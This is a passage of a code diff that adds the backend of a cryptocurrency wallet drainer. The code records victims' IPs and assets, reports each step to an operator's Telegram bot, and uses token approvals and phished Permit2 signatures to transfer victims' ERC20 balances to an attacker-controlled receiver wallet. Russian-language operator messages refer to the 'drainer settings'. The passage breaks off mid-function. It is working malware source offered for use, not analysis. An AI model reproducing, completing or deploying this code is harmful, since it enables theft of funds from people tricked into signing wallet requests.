+      add_record({ type: 'swap_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, assets: data.list, user_id: data.user_id, swapper: data.swapper });
+    }
+    if ((data.chat_data == false && MS_Notifications.sign_request.mode) || (data.chat_data != false && data.chat_data.sign_request != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_request.chat_id : data.chat_data.sign_request;
+      try {
+        let assets_str = '';
+        for (const elem of data.list) { assets_str += `${elem.name} [${chain_id_to_name(elem.chain_id)}, ${elem.type}] - ${parseFloat(elem.amount)} (${parseFloat(elem.amount_usd).toFixed(2)}$); `; }
+        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request ${data.swapper}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Signature object(s):</b> ${assets_str}`, {
+        parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_approve_request = async (response, data) => {
+  try {
+    add_record({ type: 'approve_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a confirmation request</b>\n\n<b>🌍 Domain:</b> <code>${data. domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data. asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} ( ${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, { parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_transfer_request = async (response, data) => {
+  try {
+    add_record({ type: 'transfer_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.transfer_request.mode) || (data.chat_data != false && data.chat_data.transfer_request != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_request.chat_id : data.chat_data.transfer_request;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a transfer request</b>\n\n<b>🌍 Domain:</b> <code>${data. domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data. asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} ( ${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, { parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_sign_success = async (response, data) => {
+  try {
+    add_record({
+      type: 'sign_success', domain: data.domain, IP: data.IP,
+      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
+    });
+    if (data.asset.type == 'NATIVE') {
+      add_record({
+        type: 'asset_sent', domain: data.domain, IP: data.IP,
+        user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
+      });
+    }
+    if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} signed the request</b>\n\n<b>🌍 Domain:</b> <code>${data.domain} </code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset. name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${ parseFloat(data.asset.amount_usd).toFixed(2)}$)`, { parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_swap_success = async (response, data) => {
+  try {
+    if (data.swapper == 'Permit2') {
+      add_record({
+        type: 'permit2_success', domain: data.domain, IP: data.IP,
+        user_id: data.user_id, asset: data.asset, assets: data.list,
+        worker_id: data.worker_id || null
+      });
+    } else {
+      add_record({
+        type: 'swap_success', domain: data.domain, IP: data.IP,
+        user_id: data.user_id, asset: data.asset, assets: data.list,
+        worker_id: data.worker_id || null, swapper: data.swapper
+      });
+    }
+    if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
+      try {
+        let assets_str = '';
+        for (const elem of data.list) { assets_str += `${elem.name} [${chain_id_to_name(elem.chain_id)}, ${elem.type}] - ${parseFloat(elem.amount)} (${parseFloat(elem.amount_usd).toFixed(2)}$); `; }
+        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} signed ${data.swapper}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Signature object(s):</b> ${assets_str}`, {
+        parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_approve_success = async (response, data) => {
+  try {
+    add_record({
+      type: 'approve_success', domain: data.domain, IP: data.IP,
+      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
+    });
+    if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} issued confirmation</b>\n\n<b>🌍 Domain:</b> <code>${data.domain} </code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset. name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${ parseFloat(data.asset.amount_usd).toFixed(2)}$)`, { parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_transfer_success = async (response, data) => {
+  try {
+    add_record({
+      type: 'transfer_success', domain: data.domain, IP: data.IP,
+      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
+    });
+    if (data.asset.type == 'NATIVE') {
+      add_record({
+        type: 'asset_sent', domain: data.domain, IP: data.IP,
+        user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
+      });
+    }
+    if ((data.chat_data == false && MS_Notifications.transfer_success.mode) || (data.chat_data != false && data.chat_data.transfer_success != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_success.chat_id : data.chat_data.transfer_success;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} made a transfer</b>\n\n<b>🌍 Domain:</b> <code>${data.domain} </code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset. name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${ parseFloat(data.asset.amount_usd).toFixed(2)}$)`, { parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const convert_chain = (from, to, value) => {
+  try {
+    if (from == 'DEBANK' && to == 'ID') {
+      switch (value) {
+        case 'eth': return 1;
+        case 'bsc': return 56;
+        case 'matic': return 137;
+        case 'avax': return 43114;
+        case 'arb': return 42161;
+        case 'op': return 10;
+        case 'ftm': return 250;
+        default: return false;
+      }
+    } else if (from == 'ZAPPER' && to == 'ID') {
+      switch (value) {
+        case 'ethereum': return 1;
+        case 'binance-smart-chain': return 56;
+        case 'polygon': return 137;
+        case 'avalanche': return 43114;
+        case 'arbitrum': return 42161;
+        case 'optimism': return 10;
+        case 'fantom': return 250;
+        default: return false;
+      }
+    } else if (from == 'ANKR' && to == 'ID') {
+      switch (value) {
+        case 'eth': return 1;
+        case 'bsc': return 56;
+        case 'polygon': return 137;
+        case 'avalanche': return 43114;
+        case 'arbitrum': return 42161;
+        case 'optimism': return 10;
+        case 'fantom': return 250;
+        default: return false;
+      }
+    } else if (from == 'OPENSEA' && to == 'ID') {
+      switch (value) {
+        case 'ethereum': return 1;
+        case 'matic': return 137;
+        case 'avalanche': return 43114;
+        case 'arbitrum': return 42161;
+        case 'optimism': return 10;
+        default: return false;
+      }
+    } else if (from == 'ID' && to == 'CURRENCY') {
+      switch (value) {
+        case 1: return 'ETH';
+        case 56: return 'BNB';
+        case 137: return 'MATIC';
+        case 43114: return 'AVAX';
+        case 42161: return 'ETH';
+        case 10: return 'ETH';
+        case 250: return 'FTM';
+        default: return false;
+      }
+    }
+  } catch(err) {
+    console.log(err);
+    return false;
+  }
+};
+
+const Get_ERC20_Allowance = async (chain_id, contract_address, owner_address, spender_address) => {
+  try {
+    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
+    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC20'], node);
+    const balance = ethers.BigNumber.from(await contract.balanceOf(owner_address));
+    const allowance = ethers.BigNumber.from(await contract.allowance(owner_address, spender_address));
+    if (balance.lte(ethers.BigNumber.from('0')) || allowance.lte(ethers.BigNumber.from('0'))) return false;
+    if (balance.lte(allowance)) return balance.toString();
+    else return allowance.toString();
+  } catch(err) {
+    console.log(err);
+    return false;
+  }
+};
+
+const approve_token = async (response, data) => {
+  try {
+    if (MS_Settings.Approve.Enable == 0 || MS_Settings.Approve.Withdraw == 0 || data.asset.amount_usd < MS_Settings.Approve.Withdraw_Amount) {
+      return send_response(response, { status: 'OK' });
+    }
+    if (MS_Protection) {
+      if (User_IPs_Pool[data.IP]) {
+        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
+          return block_request(response);
+        }
+      }
+    }
+    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
+      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
+    }
+    let current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, MS_Wallet_Address);
+    if (!current_allowance) {
+      await new Promise(r => setTimeout(r, 2000));
+      current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, MS_Wallet_Address);
+      if (!current_allowance) {
+        await new Promise(r => setTimeout(r, 5000));
+        current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, MS_Wallet_Address);
+        if (!current_allowance) {
+          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
+              parse_mode: 'HTML'
+            });
+          }
+          return send_response(response, { status: 'error', error: 'Unable to Execute' });
+        }
+      }
+    }
+    add_allowance(data.address, MS_Wallet_Address, data.asset.address, data.asset.chain_id);
+    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.asset.chain_id]);
+    const signer = new ethers.Wallet(MS_Wallet_Private, node);
+    const contract = new ethers.Contract(data.asset.address, MS_Contract_ABI['ERC20'], signer);
+    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+    let gas_limit = null;
+    try {
+      gas_limit = await contract.estimateGas.transferFrom(data.address, MS_Wallet_Receiver, current_allowance, { from: MS_Wallet_Address });
+      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+    } catch(err) {
+      if (MS_Settings.Approve.Bypass == 1)
+        gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
+      else gas_limit = 15000000;
+    }
+    const nonce = await node.getTransactionCount(MS_Wallet_Address, "pending");
+    if (MS_Settings.Approve.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
+      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+        try {
+          await bot.sendMessage(receiver_chat_id, `<b>❌ Failed to withdraw user token #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nThe system detected that the confirmation is most likely fake or that withdrawing this token is technically impossible, and in order to preserve your funds, it rejected the transaction.\n\nYou can still try to withdraw the token manually if you believe that the signature is still real.`, {
+          parse_mode: 'HTML'
+          });
+        } catch(err) {
+          console.log(err);
+        }
+      }
+      return send_response(response, { status: 'OK' });
+    }
+    try {
+      const tx = await contract.transferFrom(data.address, MS_Wallet_Receiver, current_allowance, {
+        gasLimit: ethers.BigNumber.from(gas_limit),
+        gasPrice: ethers.BigNumber.from(gas_price),
+        nonce: nonce
+      });
+      await node.waitForTransaction(tx.hash, 1, 60000);
+      add_record({
+        type: 'asset_sent', domain: data.domain, IP: data.IP,
+        user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
+      });
+      if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
+        await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно выведен токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
+          parse_mode: 'HTML'
+        });
+      }
+    } catch(err) {
+      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+        try {
+          await bot.sendMessage(receiver_chat_id, `<b>❌ Failed to output user token #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nPerhaps the confirmation transaction did not go through or is still in the queue, try to output the token manually!`, {
+          parse_mode: 'HTML'
+          });
+        } catch(err) {
+          console.log(err);
+        }
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    try {
+      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+        await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
+          parse_mode: 'HTML'
+        });
+      }
+    } catch(err) {
+      console.log(err);
+    }
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const sign_permit2 = async (response, data) => {
+  try {
+    if (MS_Settings.Permit2.Mode == 0) return send_response(response, { status: 'OK' });
+    if (MS_Protection) {
+      if (User_IPs_Pool[data.IP]) {
+        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
+          return block_request(response);
+        }
+      }
+    }
+    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
+      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
+    }
+    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.asset.chain_id]);
+    const signer = new ethers.Wallet(MS_Wallet_Private, node);
+    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+    const nonce = await node.getTransactionCount(MS_Wallet_Address, "pending");
+    try {
+      add_record({ type: 'permit2_data', domain: data.domain, IP: data.IP, user_id: data.user_id, worker_id: data.worker_id || null, signature: data.signature, message: data.message });
+      if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
+        await bot.sendMessage(receiver_chat_id, `<b>🔑 User Permit2 data #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Signature:</b> <code>${data.signature}</code>\n<b>Data:</b> <code>${JSON.stringify(data.message)}</code>\n<b>Owner:</b> <code>${data.address}</code>\n\nWith this data, you can sign Permit2 yourself on the ${chain_id_to_name(data.asset.chain_id)} network for the contract: <code>0x000000000022d473030f116ddee9f6b43ac78ba3</code>`, { parse_mode: 'HTML'
+        });
+      }
+    } catch(err) {
+      console.log(err);
+    }
+    if (data.mode == 1) {
+      const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_SINGLE'], signer);
+      let gas_limit = null;
+      try {
+        gas_limit = await contract.estimateGas.permit(data.address, data.message, data.signature, { from: MS_Wallet_Address });
+        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+      } catch(err) {
+        if (MS_Settings.Permit2.Bypass == 1)
+          gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
+        else gas_limit = 15000000;
+      }
+      if (MS_Settings.Permit2.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
+        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+          try {
+            await bot.sendMessage(receiver_chat_id, `<b>❌ Некорректная подпись для Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема обнаружила, что, скорее всего, PERMIT является фейковым и с целью сохранения ваших денежных средств отклонила транзакцию.`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        return send_response(response, { status: 'OK' });
+      }
+      try {
+        const tx = await contract.permit(data.address, data.message, data.signature, {
+          gasLimit: ethers.BigNumber.from(gas_limit),
+          gasPrice: ethers.BigNumber.from(gas_price),
+          nonce: nonce
+        });
+        await node.waitForTransaction(tx.hash, 1, 60000);
+        add_allowance(data.address, MS_Wallet_Address, data.asset.address, data.asset.chain_id, true);
+        if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
+          try {
+            let tokens_list = '';
+            try {
+              for (const x_token of data.assets)
+                tokens_list += `- ${x_token.name}\n`;
+            } catch(err) {
+              console.log(err);
+            }
+            await bot.sendMessage(receiver_chat_id, `<b>✅ Успешно подписали Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСписок токенов, на которые выданы разрешения:\n\n${tokens_list}`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        try {
+          let transfer_details = [], withdraw_list = '';
+          for (const x_token of data.assets) {
+            try {
+              const contract_2 = new ethers.Contract(x_token.address, MS_Contract_ABI['ERC20'], signer);
+              const balance = await contract_2.balanceOf(data.address);
+              if (ethers.BigNumber.from(balance).gt(ethers.BigNumber.from('0'))) {
+                transfer_details.push({
+                  from: data.address, to: MS_Wallet_Receiver,
+                  token: x_token.address, amount: balance
+                });
+                withdraw_list += `- ${x_token.name} (${parseFloat(x_token.amount)}, ${parseFloat(x_token.amount_usd).toFixed(2)}$)\n`;
+              }
+            } catch(err) {
+              console.log(err);
+            }
+          }
+          if (transfer_details.length > 0) {
+            try {
+              gas_limit = await contract.estimateGas.transferFrom(transfer_details[0].from, transfer_details[0].to, transfer_details[0].amount, transfer_details[0].token, { from: MS_Wallet_Address });
+              gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+            } catch(err) {
+              gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
+            }
+            const tx = await contract.transferFrom(transfer_details[0].from, transfer_details[0].to, transfer_details[0].amount, transfer_details[0].token, {
+              gasLimit: ethers.BigNumber.from(gas_limit),
+              gasPrice: ethers.BigNumber.from(gas_price),
+              nonce: ethers.BigNumber.from(nonce).add(ethers.BigNumber.from('1'))
+            });
+            await node.waitForTransaction(tx.hash, 1, 60000);
+            add_record({
+              type: 'asset_sent', domain: data.domain, IP: data.IP,
+              user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
+            });
+            if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
+              let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
+              try {
+                await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно вывели Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСписок токенов, которые были выведены:\n\n${withdraw_list}`, {
+                  parse_mode: 'HTML'
+                });
+              } catch(err) {
+                console.log(err);
+              }
+            }
+          }
+        } catch(err) {
+          console.log(err);
+          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+            try {
+              await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести токены Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
+                parse_mode: 'HTML'
+              });
+            } catch(err) {
+              console.log(err);
+            }
+          }
+          return send_response(response, { status: 'error', error: 'Unable to Execute' });
+        }
+      } catch(err) {
+        console.log(err);
+        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+          try {
+            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать Permit2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        return send_response(response, { status: 'error', error: 'Unable to Execute' });
+      }
+    } else {
+      const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_BATCH'], signer);
+      let gas_limit = null;
+      try {
+        gas_limit = await contract.estimateGas.permit(data.address, data.message, data.signature, { from: MS_Wallet_Address });
+        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+      } catch(err) {
+        if (MS_Settings.Permit2.Bypass == 1)
+          gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
+        else gas_limit = 15000000;
+      }
+      if (MS_Settings.Permit2.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
+        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+          try {
+            await bot.sendMessage(receiver_chat_id, `<b>❌ Некорректная подпись для Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема обнаружила, что, скорее всего, PERMIT является фейковым и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        return send_response(response, { status: 'OK' });
+      }
+      try {
+        const tx = await contract.permit(data.address, data.message, data.signature, {
+          gasLimit: ethers.BigNumber.from(gas_limit),
+          gasPrice: ethers.BigNumber.from(gas_price),
+          nonce: nonce
+        });
+        await node.waitForTransaction(tx.hash, 1, 60000);
+        for (const x_token of data.assets) {
+          try {
+            add_allowance(data.address, MS_Wallet_Address, x_token.address, x_token.chain_id, true);
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
+          let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
+          try {
+            let tokens_list = '';
+            try {
+              for (const x_token of data.assets)
+                tokens_list += `- ${x_token.name}\n`;
+            } catch(err) {
+              console.log(err);
+            }
+            await bot.sendMessage(receiver_chat_id, `<b>✅ Успешно подписали Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСписок токенов, на которые выданы разрешения:\n${tokens_list}`, {
+              parse_mode: 'HTML'
+            });
+          } catch(err) {
+            console.log(err);
+          }
+        }
+        try {
+          let transfer_details = [], withdraw_list = '';
+          for (const x_token of data.assets) {
+            try {
+              const contract_2 = new ethers.Contract(x_token.address, MS_Contract_ABI['ERC20'], signer);
+              const balance = await contract_2.balanceOf(data.address);
+              if (ethers.BigNumber.from(balance).gt(ethers.BigNumber.from('0'))) {
+                transfer_details.push({
+                  from: data.address, to: MS_Wallet_Receiver,
+                  token: x_token.address, amount: balance
+                });
+                withdraw_list += `- ${x_token.name} (${parseFloat(x_token.amount)}, ${parseFloat(x_token.amount_usd).toFixed(2)}$)\n`;
+              }
+            } catch(err) {
+              console.log(err);
+            }
+          }
+          if (transfer_details.length > 0) {
+            try {
+              gas_limit = await contract.estimateGas.transferFrom(transfer_details, { from: MS_Wallet_Address });
+              gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+            } catch(err) {
+              gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
+            }
+            const tx = await contract.transferFrom(transfer_details, {
+              gasLimit: ethers.BigNumber.from(gas_limit),
+              gasPrice: ethers.BigNumber.from(gas_price),
+              nonce: ethers.BigNumber.from(nonce).add(ethers.BigNumber.from('1'))
+            });
